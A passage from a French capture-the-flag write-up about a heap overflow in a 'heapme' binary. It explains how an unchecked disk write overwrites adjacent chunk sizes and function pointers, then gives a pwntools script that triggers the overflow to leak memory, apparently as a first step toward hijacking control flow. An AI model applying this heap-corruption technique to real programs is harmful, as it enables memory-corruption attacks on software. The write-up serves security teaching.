### VII. Pwn time (enfin presque)

Lors de l'execution du binaire on remarque que la fonction alarm est appelé ce qui est plutot embetant quand on essaie d'analyser le comportement d'un binaire.

![](/lib/images/writeups/2020_hexpresso_fic/upload_84e65d8f10a8afbe1ee6df1d8d84b14d.png)

Pour contourner ce problème on modifie juste l'appel de cette fonction par une série de `nop`

> Le binaire patché: http://cloud.id-iot.team/s/42r2nxx7N54PBp8

En analysant le code on remarque que le programme permet de créer un disk de taille donnée par l'utilisateur:

![](/lib/images/writeups/2020_hexpresso_fic/upload_c45be89bdf91ea44ae7596cfdcc1b643.png)

Le programme alloue la taille donnée:

![](/lib/images/writeups/2020_hexpresso_fic/upload_28a3613f36f6f1bc09e1ed72da60fa50.png)

Cependant lorsque le programme permet d'écrire dedans il oublie de checker la taille ce qui permet à l'utilisateur d'écraser les données suivantes de la heap:

![](/lib/images/writeups/2020_hexpresso_fic/upload_af3f77341f4994ce9402d83a7355f0dd.png)

Pour rappel lorsque l'on alloue de la mémoire dans la heap la structure de données est la suivante:

> `|size|data|size|data...`

Lorsqu'un chunk est libréré par free il insère le pointeur du bloc précédent. 

> `|size|pointeur|data_restante|size...`

Tout ceci s'applique seulement sur des allocations de petites tailles (fastbin).

Maintenant si on s'interesse à ce qui est alloué dans ces chunks, on remarque que c'est la classe `Disk`. Les 16 premiers bytes contiennent les adresses des fonctions de la classe. Autrement dit, read et write.

Connaisant la taille allouée lors de la création d'un disque on peut réécrire la taille du prochain bloc de la heap. Ensuite, il est possible d'écrire une nouvelle adresse pour la fonction read permettant de sauter à l'adresse écrite lors de l'overflow:

![](/lib/images/writeups/2020_hexpresso_fic/upload_b78b93d6a8b704bda3ee16a8b9f14708.png)

Maintenant, il est nécessaire de leak la `PIE` pour s'avoir où sauter.

> taille de 1 pour disque = 24 bytes de données
> 33ème byte adresse du prochain disk
> 8 premier bytes de cette meme adresse contient l'adresse de read
> 8 prochain write
> //33ème byte fonction read
> //41ème byte fonction write


cf photo
pour un peu plus de précision:

![](/lib/images/writeups/2020_hexpresso_fic/upload_becc3a7bf68a375d7ab6de210088c36a.png)

``` python
from pwn import *

def createdisk(index, size):
    print(sh.recv()),
    sh.sendline("0")
    print(0)
    print(sh.recv()),
    sh.send("%d\n" % size)
    print(size)
    print(sh.recv()),
    sh.send("%d\n" % index)
    print(sh.recvline()),

def writedisk(index, data):
    print(sh.recv()),
    sh.sendline("2")
    print(2)
    print(sh.recv()),
    sh.send("%d\n" % index)
    print(sh.recv()),
    sh.send("%s\n" % data)
    print(data)

def readdisk(index):
    print(sh.recv()),
    sh.sendline("1")
    print(1)
    print(sh.recv()),
    sh.send("%d\n" % index)
    print(index)
    a=sh.recvline()
    a=sh.recvline()
    print(len(a) - len("Data: "))
    print(a.decode('utf-8'))
    for i in a:
        print("%x " % (ord(i))),
    #print(len(a))

sh = process('./heapme_patched')
createdisk(0, 1)
createdisk(1, 1)
# to jump AAAA
#buffer='a'*23
#buffer+=chr(0x21)
#buffer+='\0'*8
#buffer+='a'*5

buffer='a'*23
buffer+=chr(0x21)
buffer+='\x01'*9
writedisk(0, buffer)
readdisk(0)
readdisk(1)
```